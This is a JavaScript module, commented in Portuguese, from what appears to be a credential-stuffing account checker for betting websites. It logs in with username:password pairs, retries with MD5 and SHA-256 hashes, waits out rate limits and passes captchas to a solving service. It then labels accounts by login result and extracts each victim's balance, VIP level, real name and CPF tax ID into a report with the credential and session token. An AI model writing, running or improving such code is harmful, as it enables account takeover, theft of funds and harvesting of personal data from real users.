import fs from "fs";
import path from "path";
import crypto from "crypto";
import { ROOT } from "./paths.js";
import { fetchPerfilHtml } from "./htmlperfil.js";
import { post, get, normalize, deepFind, infoPath, withRouter, PERFIL_PROCS, credVariants, withAuth } from "./trpc.js";
import { DEFAULT_BODY } from "./curl.js";
import { loadCaptchaConfig, solveCaptcha } from "./captcha.js";
import { loginComRefresh, trocarToken } from "./sessao.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const TOKEN_KEYS = ["token", "accessToken", "access_token", "jwt", "newJwt"];
const CAPTCHA_RE = /captcha|geetest|verifica|challenge|htoken|gee/i;
const PROSA = /\s/;
const TOKENISH = /^[A-Za-z0-9_\-\.~=+/]{16,}$/;

function dumpCaptcha(casa, username, etapa, dados) {
  try {
    const dir = path.join(ROOT, "hits");
    fs.mkdirSync(dir, { recursive: true });
    fs.appendFileSync(
      path.join(dir, "captcha_debug.txt"),
      `\n=== ${new Date().toISOString()} | ${casa.domain} | ${username} | ${etapa} ===\n${dados}\n`,
      "utf-8",
    );
  } catch {}
}

function roleOf(lower) {
  if (/device/.test(lower)) return "device";
  if (/pass|pwd|senha/.test(lower)) return "password";
  if (/user|login|account|email|phone|mobile|nick/.test(lower)) return "username";
  return null;
}

function hashPass(password, mode) {
  if (mode === "md5") return crypto.createHash("md5").update(password).digest("hex");
  if (mode === "sha256") return crypto.createHash("sha256").update(password).digest("hex");
  return password;
}

function inject(node, { username, password, deviceId }, depth = 0) {
  if (!node || typeof node !== "object" || depth > 8) return;
  if (Array.isArray(node)) {
    for (const item of node) inject(item, { username, password, deviceId }, depth + 1);
    return;
  }
  for (const key of Object.keys(node)) {
    const lower = key.toLowerCase();
    const value = node[key];
    if (value && typeof value === "object") {
      inject(value, { username, password, deviceId }, depth + 1);
      continue;
    }
    const role = roleOf(lower);
    if (!role) continue;
    if (role === "username") node[key] = username;
    else if (role === "password") node[key] = password;
    else node[key] = deviceId;
  }
}

export function findKey(root, keys, maxDepth = 10) {
  const wanted = new Set(keys.map((k) => k.toLowerCase()));
  const q = [[root, 0]];
  while (q.length) {
    const [node, depth] = q.shift();
    if (!node || typeof node !== "object" || depth > maxDepth) continue;
    for (const [k, v] of Object.entries(node)) {
      if (v === null || v === undefined || v === "") continue;
      if (wanted.has(k.toLowerCase())) return v;
    }
    for (const v of Object.values(node)) if (v && typeof v === "object") q.push([v, depth + 1]);
  }
  return null;
}

export function numFrom(v) {
  if (v === null || v === undefined || v === "") return null;
  if (typeof v === "number") return Number.isFinite(v) ? v : null;
  if (typeof v === "object") {
    for (const k of ["amount", "value", "balance", "total", "coin", "money", "goldCoin", "num", "level", "levelId", "vipLevel", "vip_level", "vipLevelId", "grade", "exp"]) {
      if (k in v) {
        const n = numFrom(v[k]);
        if (n !== null) return n;
      }
    }
    return null;
  }
  const s = String(v).replace(/[^\d,.\-]/g, "");
  if (!s || s === "-") return null;
  const norm = /,\d{1,2}$/.test(s) ? s.replace(/\./g, "").replace(",", ".") : s.replace(/,/g, "");
  const n = Number(norm);
  return Number.isFinite(n) ? n : null;
}

/** Só aceita id de verdade: sem espaço, formato token, vindo de chave explícita. */
function captchaIdFrom(norm) {
  const d = norm.data || {};
  const fortes = [];
  const fracos = [];

  const push = (lista, v, k) => {
    if (typeof v !== "string") return;
    const s = v.trim();
    if (s.length < 16 || PROSA.test(s) || !TOKENISH.test(s)) return;
    lista.push({ v: s, k: String(k) });
  };

  for (const k of ["captchaId", "captcha_id", "captchaid", "challenge", "challengeId", "gt", "geetestId", "lotNumber", "lot_number"]) {
    push(fortes, d[k], k);
    push(fortes, norm[k], k);
  }

  const fila = [[d, 0]];
  while (fila.length) {
    const [no, prof] = fila.shift();
    if (!no || typeof no !== "object" || prof > 5) continue;
    for (const [k, v] of Object.entries(no)) {
      if (typeof v === "string" && /captcha|challenge|^gt$|geetest|lot_?number/i.test(k)) push(fracos, v, k);
      else if (v && typeof v === "object") fila.push([v, prof + 1]);
    }
  }

  const escolhido = fortes[0] || fracos[0] || null;
  return escolhido ? { id: escolhido.v, chave: escolhido.k } : null;
}

function ehCaptcha(norm) {
  const txt = `${norm.msg || ""} ${JSON.stringify(norm.data || {})}`.toLowerCase();
  return CAPTCHA_RE.test(txt);
}

export async function login(casa, username, password) {
  const modos = casa.passMode && casa.passMode !== "plain" ? [casa.passMode, "plain"] : ["plain", "md5"];

  const montar = (modo) => {
    let body;
    try {
      body = JSON.parse(casa.bodyTemplate || DEFAULT_BODY);
    } catch {
      return null;
    }
    inject(body, { username, password: hashPass(password, modo), deviceId: casa.deviceId });
    return body;
  };

  let ultimo = { ok: false, error: "bodyTemplate inválido" };

  for (const modo of modos) {
    const body = montar(modo);
    if (!body) return { ok: false, error: "bodyTemplate inválido" };

    let norm = normalize(await post(casa, casa.loginPath, body));
    let token = deepFind(norm.data || {}, TOKEN_KEYS);

    if (!token && /muitas solicita|too many|rate limit|aguarde/i.test(norm.msg || "")) {
      await sleep(9000 + Math.random() * 3000);
      norm = normalize(await post(casa, casa.loginPath, body));
      token = deepFind(norm.data || {}, TOKEN_KEYS);
    }

    if (!token && ehCaptcha(norm)) {
      const cfg = loadCaptchaConfig();
      const alvoCap = captchaIdFrom(norm);
      dumpCaptcha(
        casa,
        username,
        `captcha detectado | provedor=${cfg.provider} | id=${alvoCap ? `${alvoCap.chave}=${alvoCap.id}` : "NAO ENCONTRADO"}`,
        JSON.stringify({ msg: norm.msg, code: norm.code, data: norm.data }).slice(0, 4000),
      );

      if (cfg.provider === "disabled") {
        ultimo = { ok: false, error: "captcha exigido, mas nenhum provedor configurado", code: norm.code, modo };
        continue;
      }
      if (!alvoCap) {
        ultimo = { ok: false, error: "captcha exigido, mas o id do desafio não foi encontrado na resposta", code: norm.code, modo };
        continue;
      }

      for (let tent = 1; tent <= 3 && !token; tent++) {
        const sol = await solveCaptcha(casa.domain, casa.tenantId, username, alvoCap.id);
        if (!sol) {
          ultimo = { ok: false, error: "provedor de captcha não devolveu token", code: norm.code, modo };
          await sleep(1500 * tent);
          continue;
        }

        const retry = montar(modo);
        const alvos = [retry];
        if (retry.json && typeof retry.json === "object") alvos.push(retry.json);
        for (const alvo of alvos) {
          if (sol.hToken) alvo.hToken = sol.hToken;
          if (sol.geeToken) { alvo.geeToken = sol.geeToken; alvo.gee_token = sol.geeToken; alvo.captcha = sol.geeToken; }
          if (sol.lotNumber) { alvo.lotNumber = sol.lotNumber; alvo.lot_number = sol.lotNumber; }
          if (sol.captchaOutput) { alvo.captchaOutput = sol.captchaOutput; alvo.captcha_output = sol.captchaOutput; }
          if (sol.passToken) { alvo.passToken = sol.passToken; alvo.pass_token = sol.passToken; }
          if (sol.genTime) { alvo.genTime = sol.genTime; alvo.gen_time = sol.genTime; }
          alvo.captchaId = alvoCap.id;
          alvo.captcha_id = alvoCap.id;
        }

        dumpCaptcha(casa, username, `envio captcha tentativa ${tent}`, JSON.stringify(retry).slice(0, 4000));

        norm = normalize(await post(casa, casa.loginPath, retry));
        token = deepFind(norm.data || {}, TOKEN_KEYS);
        dumpCaptcha(casa, username, `resposta tentativa ${tent}`, JSON.stringify({ msg: norm.msg, code: norm.code, ok: !!token }).slice(0, 1000));
        if (!token) await sleep(1200 * tent);
      }

      if (!token) {
        ultimo = { ok: false, error: norm.msg || "captcha não aceito", code: norm.code, modo };
        continue;
      }
    }

    if (!token) {
      ultimo = { ok: false, error: norm.msg || `login sem token (code=${norm.code})`, code: norm.code, modo, raw: String(norm.msg || "") };
      continue;
    }

    const sess = await trocarToken(casa, token);
    if (!sess.authTag) {
      ultimo = { ok: false, error: sess.erro || "auth.token não devolveu authTag", token, modo };
      continue;
    }
    return { ok: true, token, tag: sess.tag, authTag: sess.authTag, tokenData: sess.tokenData, userId: sess.userId, modo };
  }

  return ultimo;
}

const INFO_PROCS = ["user.assets", "vip.info", "vip.vip", "user.details", "main.perfil"];

function mergeInto(dest, src, depth = 0) {
  if (!src || typeof src !== "object" || Array.isArray(src) || depth > 4) return dest;
  for (const [k, v] of Object.entries(src)) {
    if (v && typeof v === "object" && !Array.isArray(v)) {
      dest[k] = mergeInto(dest[k] && typeof dest[k] === "object" ? dest[k] : {}, v, depth + 1);
    } else if (!(k in dest)) {
      dest[k] = v;
    }
  }
  return dest;
}

/** Abre a página /main/perfil (via procedures) e junta VIP + saldo. */
export async function fetchPerfil(casa, auth) {
  const alvos = [];
  if (casa.perfilPath) alvos.push(casa.perfilPath);
  for (const proc of [...(casa.perfilProcs || []), ...PERFIL_PROCS]) {
    const path = withRouter(casa, proc);
    if (!alvos.includes(path)) alvos.push(path);
  }

  const combinado = {};
  const erros = [];

  const tentar = async (path, metodo, authV) => {
    try {
      const raw = metodo === "GET"
        ? await get(casa, path, { json: {} }, authV)
        : await post(casa, path, { json: {} }, authV);
      const norm = normalize(raw);
      if (norm.ok && norm.data && typeof norm.data === "object") {
        mergeInto(combinado, norm.data);
        return true;
      }
      if (!norm.ok) erros.push(`${path.split("/trpc/")[1]}: ${norm.msg}`);
    } catch (e) {
      erros.push(`${path.split("/trpc/")[1]}: ${e.message}`);
    }
    return false;
  };

  for (const cred of credVariants(auth)) {
    const authV = withAuth(auth, cred);
    for (const path of alvos) {
      if (!(await tentar(path, "GET", authV))) await tentar(path, "POST", authV);
      const acc = extractAccount(combinado, casa);
      if (acc.balance !== null && acc.vip !== null) break;
    }
    const acc = extractAccount(combinado, casa);
    if (acc.balance !== null && acc.vip !== null) break;
  }

  if (!Object.keys(combinado).length) {
    return { ok: false, error: erros[0] || "perfil não respondeu", data: null };
  }
  return { ok: true, data: combinado };
}

export async function fetchInfo(casa, auth) {
  const procs = [infoPath(casa), ...INFO_PROCS.map((p) => withRouter(casa, p))];
  const vistos = new Set();
  const combinado = {};
  const erros = [];

  for (const cred of credVariants(auth)) {
    const authV = withAuth(auth, cred);
    for (const path of procs) {
      if (!path || vistos.has(`${cred}|${path}`)) continue;
      vistos.add(`${cred}|${path}`);
      try {
        let norm = normalize(await get(casa, path, { json: {} }, authV));
        if (!norm.ok) norm = normalize(await post(casa, path, { json: {} }, authV));
        if (norm.ok && norm.data && typeof norm.data === "object") mergeInto(combinado, norm.data);
        else if (!norm.ok) erros.push(`${path.split("/trpc/")[1]}: ${norm.msg}`);
      } catch (e) {
        erros.push(`${path.split("/trpc/")[1]}: ${e.message}`);
      }
    }
    const acc = extractAccount(combinado, casa);
    if (acc.balance !== null && acc.vip !== null) break;
  }

  if (!Object.keys(combinado).length) {
    return { ok: false, error: erros[0] || "nenhuma procedure de info respondeu", data: null };
  }
  return { ok: true, data: combinado };
}

const BALANCE_KEYS = [
  "balance", "goldCoin", "game_gold", "gameGold", "walletBalance", "wallet_balance",
  "saldo", "money", "credit", "available", "coin", "amount", "totalAmount", "rmb",
  "score", "point", "remainAmount", "withdrawable", "withdrawAmount",
];

const VIP_LABEL_KEYS = [
  "vipName", "vip_name", "vipTitle", "vip_title", "vipLabel", "levelName",
  "level_name", "gradeName", "grade_name", "vipLevelName", "vipDesc", "vip_desc",
];

/** Nível VIP: vem de vip.info → currentVipLevel.level. */
function vipFrom(root) {
  const atual = findKey(root, ["currentVipLevel", "curVipLevel", "currentLevel", "currentGrade"]);
  if (atual && typeof atual === "object") {
    const n = numFrom(atual.level ?? atual.levelId ?? atual.id ?? atual.grade);
    if (n !== null) return n;
  }
  if (typeof atual === "number") return atual;

  const direto = numFrom(findKey(root, ["vipLevel", "vip_level", "vipLevelId", "vip", "level", "grade", "levelId"]));
  if (direto !== null) return direto;

  const strs = [];
  const q = [[root, 0]];
  while (q.length) {
    const [node, depth] = q.shift();
    if (!node || typeof node !== "object" || depth > 8) continue;
    for (const v of Object.values(node)) {
      if (typeof v === "string") strs.push(v);
      else if (v && typeof v === "object") q.push([v, depth + 1]);
    }
  }
  for (const s of strs) {
    const m = s.match(/\bv\s?(\d{1,2})\b/i);
    if (m) return Number(m[1]);
  }
  for (const s of strs) {
    const m = s.match(/vip\s?(\d{1,2})/i);
    if (m) return Number(m[1]);
  }
  return null;
}

/** Saldo bruto: user.assets.balance primeiro. Vem em centavos. */
function balanceFrom(root) {
  const ativos = findKey(root, ["user.assets", "assets", "wallet"]);
  if (ativos && typeof ativos === "object" && "balance" in ativos) {
    const n = numFrom(ativos.balance);
    if (n !== null) return n;
  }
  return numFrom(findKey(root, BALANCE_KEYS));
}

export function extractAccount(data, casa) {
  const root = data || {};
  const label = findKey(root, VIP_LABEL_KEYS);
  const bruto = balanceFrom(root);
  const div = Number(casa?.balanceDivisor ?? 100) || 1;
  return {
    userId: String(findKey(root, ["userId", "user_id", "memberId", "member_id", "uid", "id"]) ?? ""),
    balance: bruto === null ? null : bruto / div,
    vip: vipFrom(root),
    vipLabel: typeof label === "string" ? label.trim().slice(0, 20) : "",
    realname: String(findKey(root, ["userName", "username", "realname", "real_name", "full_name", "nickname", "accountName"]) ?? ""),
    cpf: String(findKey(root, ["cpf", "tax_id", "taxId", "document"]) ?? ""),
    rawStatus: findKey(root, ["user_status", "userStatus", "accountStatus", "type", "status"]),
  };
}

export function statusLabel(rawStatus) {
  if (typeof rawStatus === "boolean") return "";
  if (rawStatus === 1 || rawStatus === 2 || rawStatus === "active" || rawStatus === "normal") return "ativa";
  if (rawStatus === 7 || rawStatus === 8 || rawStatus === "blocked" || rawStatus === "frozen" || rawStatus === "ban") return "proibida";
  return rawStatus !== null && rawStatus !== undefined ? `status=${rawStatus}` : "";
}

const NEG_PASSWORD = ["password", "senha", "incorrect", "incorreta", "wrong", "errada", "invalid", "inválid", "错误", "密码"];
const NEG_NOTFOUND = ["not exist", "não existe", "nao existe", "user not found", "no exist", "inexist", "não encontrad", "nao encontrad", "usuário não", "不存在"];
const NEG_BLOCKED = ["blocked", "bloquead", "freeze", "congelad", "risk", "abnormal", "proibid", "suspens", "冻结", "封"];

export function classifyMessage(msg) {
  const m = String(msg || "").toLowerCase();
  if (!m) return null;
  if (m.includes("cloudflare") || m.includes("html/bloqueio") || m.includes("<!doctype")) return { status: "BLOQUEIO", detail: m };
  if (m.includes("schema-error") || m.includes("schema error")) return { status: "SCHEMA", detail: m };
  if (m.includes("muitas solicita") || m.includes("rate limit")) return { status: "RATE", detail: m };
  if (NEG_NOTFOUND.some((k) => m.includes(k))) return { status: "NAO_EXISTE", detail: m };
  if (NEG_PASSWORD.some((k) => m.includes(k))) return { status: "SENHA_ERRADA", detail: m };
  if (NEG_BLOCKED.some((k) => m.includes(k))) return { status: "PROIBIDA", detail: m };
  if (m.includes("captcha") || m.includes("verif") || m.includes("challenge")) return { status: "CAPTCHA", detail: m };
  return null;
}

/** Login → perfil (VIP + saldo). Sem aba de saques. */
export async function fullCheck(casa, casaNome, username, password) {
  const report = {
    casa: casaNome, conta: `${username}:${password}`, status: "ERRO", detalhe: "",
    saldo: null, vip: null, vipLabel: "", nome: "", cpf: "", token: null,
  };

  try {
    const auth = await loginComRefresh(casa, username, password);
    if (!auth.ok) {
      const cls = classifyMessage(auth.error);
      report.status = cls ? cls.status : "INCONCLUSIVO";
      report.detalhe = `${auth.error}${auth.modo ? ` [modo=${auth.modo}]` : ""}`;
      return report;
    }
    report.token = auth.authTag || auth.token;
    report.status = "LOGIN_OK";

    const perfil = await fetchPerfil(casa, auth);
    let acc = perfil.ok && perfil.data ? extractAccount(perfil.data) : null;

    if (!acc || acc.balance === null) {
      const htmlPerfil = await fetchPerfilHtml(casa, auth);
      if (htmlPerfil.ok) {
        acc = {
          ...(acc || {}),
          balance: acc?.balance ?? htmlPerfil.data.balance,
          vip: acc?.vip ?? htmlPerfil.data.vip,
        };
      }
    }

    if (acc) {
      report.saldo = acc.balance;
      report.vip = acc.vip;
      report.vipLabel = acc.vipLabel || "";
      report.nome = acc.realname;
      report.cpf = acc.cpf;
      const st = statusLabel(acc.rawStatus);
      if (st === "proibida") report.status = "PROIBIDA";
      if (acc.balance === null && acc.vip === null) {
        const base = (perfil.ok ? perfil.data : null) || {};
        const chaves = Object.keys(base).slice(0, 12).join(",");
        report.detalhe = `perfil sem saldo/vip (chaves: ${chaves || "vazio"})`;
      }
    }

    return report;
  } catch (e) {
    report.status = "ERRO";
    report.detalhe = e.message;
    return report;
  }
}